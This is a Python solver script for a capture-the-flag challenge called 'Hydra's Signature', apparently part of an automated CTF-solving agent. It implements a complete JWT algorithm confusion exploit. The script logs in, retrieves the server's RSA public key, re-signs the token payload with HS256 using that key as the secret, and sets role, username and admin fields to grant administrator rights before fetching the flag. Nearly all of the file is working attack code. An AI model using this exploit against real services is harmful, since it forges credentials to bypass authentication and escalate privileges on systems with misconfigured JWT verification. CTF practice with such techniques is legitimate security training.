"""Hydra's Signature: JWT Algorithm Confusion solver."""
from flag_utils import extract_flag
import requests
import jwt
import json

class HydraSolver:
    """JWT algorithm confusion attack (RS256 -> HS256)."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        1. POST /login to get a JWT
        2. GET /pubkey to get the public key
        3. Forge a JWT with HS256 using the public key as secret
        4. GET /flag with forged token
        """
        print("=== Hydra's Signature: JWT Algorithm Confusion ===", flush=True)

        try:
            # Step 1: Get a token
            login_resp = requests.post(
                f"{self.base_url}/login",
                json={"username": "test"},
                timeout=10
            )
            print(f"Login status: {login_resp.status_code}", flush=True)
            print(f"Login response: {login_resp.text[:500]}", flush=True)

            if login_resp.status_code != 200:
                print("Failed to login", flush=True)
                return None

            # Extract token
            login_data = login_resp.json()
            original_token = login_data.get("token") or login_data.get("access_token")
            print(f"Original token: {original_token[:50]}...", flush=True)

            # Decode to see payload
            decoded = jwt.decode(original_token, options={"verify_signature": False})
            print(f"Decoded payload: {decoded}", flush=True)

            # Step 2: Get public key
            pubkey_resp = requests.get(f"{self.base_url}/pubkey", timeout=10)
            print(f"Pubkey status: {pubkey_resp.status_code}", flush=True)
            print(f"Pubkey response: {pubkey_resp.text[:500]}", flush=True)

            if pubkey_resp.status_code != 200:
                print("Failed to get public key", flush=True)
                return None

            public_key = pubkey_resp.text.strip()
            print(f"Public key: {public_key[:100]}...", flush=True)

            # Step 3: Forge JWT with HS256 using public key as secret
            # Modify payload to be admin
            forged_payload = decoded.copy()
            forged_payload["role"] = "admin"
            forged_payload["username"] = "admin"
            forged_payload["admin"] = True

            # Sign with HS256 using public key as secret
            forged_token = jwt.encode(
                forged_payload,
                public_key,
                algorithm="HS256"
            )
            print(f"Forged token: {forged_token[:50]}...", flush=True)

            # Step 4: Get flag with forged token
            flag_resp = requests.get(
                f"{self.base_url}/flag",
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=10
            )
            print(f"Flag status: {flag_resp.status_code}", flush=True)
            print(f"Flag response: {flag_resp.text[:500]}", flush=True)

            # Extract flag
            flag = extract_flag(flag_resp.text)
            if flag:
                    return flag

        except Exception as e:
            print(f"Error: {e}", flush=True)
            import traceback
            traceback.print_exc()

        print("Failed to exploit JWT", flush=True)
        return None
